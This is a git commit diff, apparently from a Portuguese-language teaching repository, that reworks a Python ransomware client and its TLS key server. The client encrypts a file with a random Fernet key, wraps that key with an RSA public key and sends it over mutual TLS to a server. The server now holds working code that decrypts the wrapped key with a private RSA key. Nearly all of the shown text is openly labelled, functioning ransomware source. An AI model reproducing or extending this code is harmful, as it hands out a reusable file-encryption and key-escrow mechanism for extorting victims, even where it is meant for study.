91e09a52a430926c133f1f1839753d14558193fa
fln99 <59563220+fln99@users.noreply.github.com>
2023-06-06 09:48:29 -0300

    Update ransomware.py

--- capitulo-5/ransomware.py
+++ capitulo-5/ransomware.py
@@ -1,4 +1,5 @@
 import socket
+import ssl
 
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
@@ -17,48 +18,73 @@ def decrypt_file(file_path, key):
 
 
 def send_encrypted_key(e_key_file_path):
+    with open(e_key_file_path, "rb") as file:
+        encrypted_key = file.read()
+
     with socket.create_connection((HOST, PORT)) as sock:
-        with open(e_key_file_path, "rb") as file:
-            sock.send(file.read())
-        decrypted_key = sock.recv(1024)
+        with setup_context().wrap_socket(sock, server_side=False, server_hostname=HOST) as ssock:
+            ssock.send(encrypted_key)
+            decrypted_key = ssock.recv(1024)
 
     return decrypted_key
 
 
-symmetric_key = Fernet.generate_key()
-FernetInstance = Fernet(symmetric_key)
+def encrypt_symmetric_key():
+    with open(PUBLIC_KEY, "rb") as key_file:
+        public_key = serialization.load_pem_public_key(
+            key_file.read(),
+            backend=default_backend())
+
+    encrypted_symmetric_key = public_key.encrypt(symmetric_key, padding.OAEP(
+        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(),
+        label=None))
+    
+    return encrypted_symmetric_key
+
+
+def encrypt_data(file_path):
+    with open(file_path, "rb") as file:
+        file_data = file.read()
+        encrypted_data = FernetInstance.encrypt(file_data)
+
+    with open(file_path, "wb") as file:
+        file.write(encrypted_data)
+
+
+def setup_context():
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS, cafile=SERVER_CERT)
+    context.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
+    context.load_verify_locations(cafile=SERVER_CERT)
+    context.verify_mode = ssl.CERT_REQUIRED
+    context.options |= ssl.OP_SINGLE_ECDH_USE
+    context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2
+
+    return context
+
+
+CLIENT_KEY = "../../TLS/client.key"
+CLIENT_CERT = "../../TLS/client.crt"
+SERVER_CERT = "../../TLS/server.crt"
+
+PUBLIC_KEY = "../../RSA/public_key.key"
+ENCRYPTED_SK_PATH = "encrypted_symmetric_key.key"
+FILE_PATH = "file_to_encrypt.txt"
 
 HOST, PORT = "127.0.0.1", 8000
 
-with open("../../RSA/public_key.key", "rb") as key_file:
-    public_key = serialization.load_pem_public_key(
-            key_file.read(),
-            backend=default_backend()
-            )
+symmetric_key = Fernet.generate_key()
+FernetInstance = Fernet(symmetric_key)
 
-encrypted_symmetric_key = public_key.encrypt(
-        symmetric_key,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-            )
-        )
+encrypted_symmetric_key = encrypt_symmetric_key()
 
-with open("encrypted_symmetric_key.key", "wb") as key_file:
+with open(ENCRYPTED_SK_PATH, "wb") as key_file:
     key_file.write(encrypted_symmetric_key)
 
-decrypted_symmetric_key = send_encrypted_key("encrypted_symmetric_key.key")
+encrypt_data(FILE_PATH)
 
-file_path = "file_to_encrypt.txt"
+decrypted_symmetric_key = send_encrypted_key(ENCRYPTED_SK_PATH)
 
-with open(file_path, "rb") as file:
-    file_data = file.read()
-    encrypted_data = FernetInstance.encrypt(file_data)
-
-with open(file_path, "wb") as file:
-    file.write(encrypted_data)
-
-decrypt_file(file_path, decrypted_symmetric_key)
+decrypt_file(FILE_PATH, decrypted_symmetric_key)
 
 quit()
--- capitulo-6/tls_ransomware_server.py
+++ capitulo-6/tls_ransomware_server.py
@@ -2,30 +2,40 @@ import socket
 import ssl
 import threading
 
-client_cert = "../../TLS/client.crt"
-server_key = "../../TLS/server.key"
-server_cert = "../../TLS/server.crt"
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import padding
 
-port = 8080
+CLIENT_CERT = "../../TLS/client.crt"
+SERVER_KEY = "../../TLS/server.key"
+SERVER_CERT = "../../TLS/server.crt"
+PRIVATE_KEY = "../../RSA/pub_priv_pair.key"
+
+PORT = 8000
 
 context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
 context.verify_mode = ssl.CERT_REQUIRED
-context.load_verify_locations(cafile=client_cert)
-context.load_cert_chain(certfile=server_cert, keyfile=server_key)
+context.load_verify_locations(cafile=CLIENT_CERT)
+context.load_cert_chain(certfile=SERVER_CERT, keyfile=SERVER_KEY)
 context.options |= ssl.OP_SINGLE_ECDH_USE
 context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2
 
 def handler(conn):
-    encrypted_key = conn.recv(4096).decode()
+    encrypted_key = conn.recv(1024).strip()
 
-    # decryption code here
+    with open(PRIVATE_KEY, "rb") as pkey_file:
+            private_key = serialization.load_pem_private_key(pkey_file.read(), password=None)
+        
+    decrypted_key = private_key.decrypt(encrypted_key, padding.OAEP(
+         mgf=padding.MGF1(algorithm=hashes.SHA256()),
+         algorithm=hashes.SHA256(),
+         label=None))
 
-    conn.send(decrypted_key.encode())
+    conn.send(decrypted_key)
     conn.close()
 
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
-    sock.bind(("", port))
+    sock.bind(("", PORT))
     sock.listen(5)
 
     with context.wrap_socket(sock, server_side=True) as ssock:
